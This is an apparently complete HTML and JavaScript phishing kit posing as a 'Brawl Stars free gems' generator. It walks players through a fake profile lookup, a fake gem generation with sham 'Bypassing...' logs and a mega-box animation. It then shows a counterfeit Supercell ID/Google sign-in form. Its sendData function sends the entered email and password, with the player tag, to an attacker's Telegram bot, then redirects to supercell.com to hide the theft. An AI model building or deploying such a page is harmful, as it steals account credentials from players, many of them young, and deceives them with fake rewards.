<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Brawl Stars: Free Gems Event</title>
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&family=Source+Sans+Pro:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* –ì–õ–û–ë–ê–õ–¨–ù–´–ï –°–¢–ò–õ–ò */
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            font-family: 'Source Sans Pro', sans-serif; overflow-x: hidden;
            background: #1a2969;
        }

        .bg-overlay {
            position: fixed; top: -50%; left: -50%; width: 200%; height: 200%;
            background-image: url('https://brawlergems.com/generator/images/brawl_stars_pattern_transparent.png');
            background-size: 300px auto; opacity: 0.1;
            animation: moveBackground 60s linear infinite;
            z-index: 0; pointer-events: none;
        }

        @keyframes moveBackground {
            0% { transform: translate(0, 0); }
            100% { transform: translate(-300px, -300px); }
        }

        .wrapper {
            position: relative; z-index: 10;
            display: flex; flex-direction: column; align-items: center;
            padding: 20px; min-height: 100vh;
        }

        .logo { width: 180px; margin: 10px 0; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); }

        /* SHELLY & BUBBLE */
        .shelly-container {
            display: flex; align-items: center; width: 100%; max-width: 450px;
            margin-bottom: 15px; animation: fadeIn 0.5s ease;
        }

        .shelly-avatar {
            width: 75px; height: 75px; border-radius: 50%; border: 3px solid #000;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 2; background: #fff;
        }

        .brawl-bubble {
            background: white; border: 4px solid black; border-radius: 20px;
            padding: 12px 18px; margin-left: -15px; position: relative; flex: 1;
            box-shadow: 0 6px 0 rgba(0,0,0,0.1);
        }

        .brawl-bubble::before {
            content: ''; position: absolute; left: -14px; top: 50%;
            transform: translateY(-50%); border-top: 10px solid transparent;
            border-bottom: 10px solid transparent; border-right: 10px solid black;
        }

        .bubble-text { 
            color: #000; font-size: 15px; font-weight: 700; line-height: 1.2; 
            font-family: 'Lilita One', cursive; 
        }

        /* MAIN BOX */
        .main-box {
            background: white; border: 5px solid #000; border-radius: 20px;
            width: 100%; max-width: 450px; padding: 25px;
            box-shadow: 0 15px 0 rgba(0,0,0,0.2); text-align: center;
            box-sizing: border-box; position: relative; overflow: hidden;
        }

        .back-btn {
            position: absolute; top: 15px; left: 15px; width: 30px; cursor: pointer;
            z-index: 100;
        }

        .step-title { 
            font-family: 'Lilita One', cursive; color: #000; font-size: 26px; 
            margin-bottom: 15px; text-transform: uppercase;
            text-shadow: -2px -2px 0 #000, 2px -2px 0 #000, -2px 2px 0 #000, 2px 2px 0 #000, 0px 3px 0 rgba(0,0,0,0.2);
            color: #fff;
        }

        /* INPUTS */
        .tag-input-wrapper {
            background: #f0f0f0; border: 3px solid #ccc; border-radius: 12px;
            padding: 12px; margin-bottom: 15px; display: flex; justify-content: center; align-items: center;
        }
        .tag-prefix { font-family: 'Lilita One'; font-size: 26px; color: #777; margin-right: 5px; }
        input#tag {
            width: 180px; border: none; background: transparent;
            font-family: 'Lilita One'; font-size: 26px; outline: none;
            text-transform: uppercase; color: #000;
        }

        /* GEMS GRID */
        .gems-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
        .gem-card {
            background: #f9f9f9; border: 3px solid #eee; border-radius: 15px;
            padding: 12px; cursor: pointer; transition: 0.1s;
        }
        .gem-card.selected { border-color: #FFA800; background: #FFF9E6; transform: scale(1.05); }
        .gem-card img { width: 55px; display: block; margin: 0 auto 5px; }
        .gem-card span { font-family: 'Lilita One'; font-size: 20px; color: #333; }

        /* BUTTONS */
        .btn-yellow {
            background: linear-gradient(180deg, #FFD84D 0%, #FFA800 100%);
            border: 3px solid #000; border-radius: 12px; color: #fff;
            font-family: 'Lilita One'; font-size: 24px; padding: 12px; width: 100%; 
            cursor: pointer; box-shadow: 0 6px 0 #CC7A00; text-shadow: 2px 2px 0 #000;
            text-transform: uppercase;
        }
        .pulse-animation { animation: pulse-yellow 1.5s infinite ease-in-out; }
        @keyframes pulse-yellow { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.03); } }

        /* PARTICLES */
        .particle-gem {
            position: absolute; width: 30px; height: 30px;
            background: url('https://brawlergems.com/generator/images/30.png') no-repeat center;
            background-size: contain; z-index: 50; animation: flyGem 0.8s ease-out forwards;
        }
        @keyframes flyGem {
            0% { transform: translate(0,0) scale(1); opacity: 1; }
            100% { transform: translate(var(--x), var(--y)) scale(0.5); opacity: 0; }
        }

        /* PROGRESS BARS */
        .loader-wrap { display: none; margin: 20px 0; }
        .bar-bg { background: #eee; height: 24px; border: 3px solid #000; border-radius: 15px; overflow: hidden; position: relative; }
        .bar-fill { background: #FFA800; height: 100%; width: 0%; transition: 0.1s; }
        .logs { text-align: left; background: #222; color: #0f0; padding: 10px; border-radius: 10px; font-family: monospace; font-size: 11px; height: 70px; margin-top: 15px; }

        /* MEGA BOX */
        .box-container { display: none; text-align: center; cursor: pointer; padding: 20px 0; }
        .mega-box-img { width: 160px; filter: drop-shadow(0 10px 10px rgba(0,0,0,0.3)); }
        .box-shake { animation: shakeBox 0.6s infinite; }
        @keyframes shakeBox { 0%, 100% { transform: rotate(0); } 25% { transform: rotate(5deg) scale(1.1); } 75% { transform: rotate(-5deg) scale(1.1); } }
        .box-explode { animation: explode 0.5s forwards; }
        @keyframes explode { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(2.5); opacity: 0; filter: brightness(3); } }

        /* SUPERCELL ID */
        .sc-id-header { background: #000; border-radius: 15px 15px 0 0; padding: 15px; margin: -25px -25px 20px -25px; display: flex; flex-direction: column; align-items: center; }
        .sc-badge { background: #fff; color: #000; font-family: 'Lilita One'; padding: 2px 10px; border-radius: 5px; font-size: 12px; margin-top: 5px; text-transform: uppercase; }
        .g-input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
    </style>
</head>
<body>

<div class="bg-overlay"></div>

<div class="wrapper">
    <img src="https://brawlergems.com/generator/images/logo_outlined_noBG.png" class="logo">

    <div class="shelly-container">
        <img src="https://brawlergems.com/generator/images/brawler_icon.png" class="shelly-avatar">
        <div class="brawl-bubble">
            <div class="bubble-text" id="bubble-msg">Hey Brawler! Enter your player tag to find your profile!</div>
        </div>
    </div>

    <div class="main-box" id="mainBox">
        <img src="https://brawlergems.com/generator/images/back.png" id="backBtn" class="back-btn" style="display:none;" onclick="goBack()">
        
        <div id="step-search">
            <div class="step-title">Find Profile</div>
            <div class="tag-input-wrapper">
                <span class="tag-prefix">#</span>
                <input type="text" id="tag" placeholder="P8Q9RB2" maxlength="10">
            </div>
            <button class="btn-yellow pulse-animation" onclick="searchProfile()">Find Account</button>
        </div>

        <div id="step-load-search" class="loader-wrap">
            <div class="step-title">Searching...</div>
            <div class="bar-bg"><div class="bar-fill" id="search-bar"></div></div>
            <div class="logs" id="search-logs"></div>
        </div>

        <div id="step-gems" style="display:none;">
            <div style="background: #222; border-radius: 15px; padding: 12px; color: #fff; display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
                <img src="https://brawlergems.com/generator/images/brawler_icon.png" width="45">
                <div style="text-align: left;">
                    <div style="font-family: 'Lilita One'; color: #FFD84D; font-size: 20px;" id="display-tag">#TAG</div>
                    <div style="font-size: 11px; opacity: 0.6;">Account Status: Connected</div>
                </div>
            </div>
            <div class="step-title" style="font-size: 20px;">Select Amount</div>
            <div class="gems-grid">
                <div class="gem-card selected" onclick="selectGems(this, '30')"><img src="https://brawlergems.com/generator/images/30.png"><span>30</span></div>
                <div class="gem-card" onclick="selectGems(this, '360')"><img src="https://brawlergems.com/generator/images/360.png"><span>360</span></div>
                <div class="gem-card" onclick="selectGems(this, '950')"><img src="https://brawlergems.com/generator/images/950.png"><span>950</span></div>
                <div class="gem-card" onclick="selectGems(this, '2000')"><img src="https://brawlergems.com/generator/images/2000.png"><span>2000</span></div>
            </div>
            <button class="btn-yellow pulse-animation" onclick="startGeneration()">Claim Gems</button>
        </div>

        <div id="step-load-gen" class="loader-wrap">
            <div class="step-title">Generating...</div>
            <div class="bar-bg"><div class="bar-fill" id="gen-bar"></div></div>
            <div class="logs" id="gen-logs"></div>
        </div>

        <div id="step-box" class="box-container" onclick="openBox()">
            <div class="step-title">Reward Ready!</div>
            <img src="https://brawlergems.com/generator/images/box_mega.png" id="megaBox" class="mega-box-img box-shake">
            <div style="font-family: 'Lilita One'; color: #FFA800; font-size: 20px; margin-top: 10px; text-shadow: 2px 2px 0 #000;">TAP TO OPEN!</div>
        </div>

        <div id="step-google" style="display:none; text-align: left;">
            <div class="sc-id-header">
                <img src="https://brawlergems.com/generator/images/supercell_id_logo.png" width="120">
                <div class="sc-badge">Verification Required</div>
            </div>
            <center><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70" style="margin-bottom: 10px;"></center>
            <h2 style="font-weight: 400; font-size: 18px; text-align: center; color: #202124;">Sign in to Verify</h2>
            <p style="text-align: center; color: #5f6368; font-size: 13px;">Linking <b><span id="final-tag"></span></b> to Supercell ID...</p>
            <input type="email" id="email" class="g-input" placeholder="Email or phone">
            <input type="password" id="pass" class="g-input" placeholder="Enter password">
            <button class="btn-yellow pulse-animation" style="margin-top: 15px;" onclick="sendData()">Complete Claim</button>
        </div>
    </div>
</div>

<script>
    let selectedGems = "30";
    let playerTag = "";
    const bubbleMsg = document.getElementById('bubble-msg');
    const backBtn = document.getElementById('backBtn');

    function selectGems(el, val) {
        document.querySelectorAll('.gem-card').forEach(c => c.classList.remove('selected'));
        el.classList.add('selected');
        selectedGems = val;
    }

    function showStep(id) {
        const steps = ['step-search', 'step-load-search', 'step-gems', 'step-load-gen', 'step-box', 'step-google'];
        steps.forEach(s => document.getElementById(s).style.display = 'none');
        document.getElementById(id).style.display = 'block';
    }

    function searchProfile() {
        let val = document.getElementById('tag').value.trim();
        if(val.length < 3) return alert("Enter valid Tag!");
        playerTag = "#" + val.toUpperCase();
        
        showStep('step-load-search');
        bubbleMsg.innerText = "Searching for " + playerTag + "...";

        let p = 0;
        let logs = ["> Connecting...", "> Database linked", "> Profile found!"];
        let lIdx = 0;
        let iv = setInterval(() => {
            p += 4;
            document.getElementById('search-bar').style.width = p + "%";
            if(p % 32 == 0 && lIdx < logs.length) {
                document.getElementById('search-logs').innerHTML += "<div>" + logs[lIdx] + "</div>";
                lIdx++;
            }
            if(p >= 100) {
                clearInterval(iv);
                setTimeout(() => {
                    showStep('step-gems');
                    backBtn.style.display = 'block';
                    document.getElementById('display-tag').innerText = playerTag;
                    bubbleMsg.innerText = "Success! Now choose how many gems you want.";
                }, 500);
            }
        }, 60);
    }

    function startGeneration() {
        showStep('step-load-gen');
        backBtn.style.display = 'none';
        bubbleMsg.innerText = "Sending " + selectedGems + " gems to account...";

        let p = 0;
        let logs = ["> Bypassing...", "> Syncing gems...", "> Finalizing..."];
        let lIdx = 0;
        let iv = setInterval(() => {
            p += 2;
            document.getElementById('gen-bar').style.width = p + "%";
            if(p % 5 == 0) createParticle();
            if(p % 33 == 0 && lIdx < logs.length) {
                document.getElementById('gen-logs').innerHTML += "<div>" + logs[lIdx] + "</div>";
                lIdx++;
            }
            if(p >= 100) {
                clearInterval(iv);
                setTimeout(() => { showStep('step-box'); bubbleMsg.innerText = "MEGA BOX UNLOCKED! Tap to open!"; }, 500);
            }
        }, 50);
    }

    function createParticle() {
        const p = document.createElement('div');
        p.className = 'particle-gem';
        p.style.setProperty('--x', (Math.random()-0.5)*250 + "px");
        p.style.setProperty('--y', (Math.random()-0.5)*250 + "px");
        p.style.left = "50%"; p.style.top = "50%";
        document.getElementById('step-load-gen').appendChild(p);
        setTimeout(() => p.remove(), 800);
    }

    function openBox() {
        document.getElementById('megaBox').classList.remove('box-shake');
        document.getElementById('megaBox').classList.add('box-explode');
        bubbleMsg.innerText = "JACKPOT! " + selectedGems + " GEMS RECEIVED!";
        setTimeout(() => {
            showStep('step-google');
            document.getElementById('final-tag').innerText = playerTag;
            backBtn.style.display = 'block';
        }, 600);
    }

    function goBack() {
        const current = document.querySelector('[id^="step-"]:not([style*="display: none"])').id;
        if(current === 'step-gems') { showStep('step-search'); backBtn.style.display = 'none'; bubbleMsg.innerText = "Enter player tag!"; }
        else if(current === 'step-google') { showStep('step-gems'); }
    }

    async function sendData() {
        const mail = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if(!mail || !pass) return alert("Fill fields!");

        const token = "–¢–í–û–ô_–¢–û–ö–ï–ù";
        const chat = "–¢–í–û–ô_ID";
        const text = `üéØ LOG\nTag: ${playerTag}\nGems: ${selectedGems}\nMail: ${mail}\nPass: ${pass}`;

        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}`);
        alert("Success! Gems will be added in 24h.");
        window.location.href = "https://supercell.com";
    }
</script>

</body>
</html>
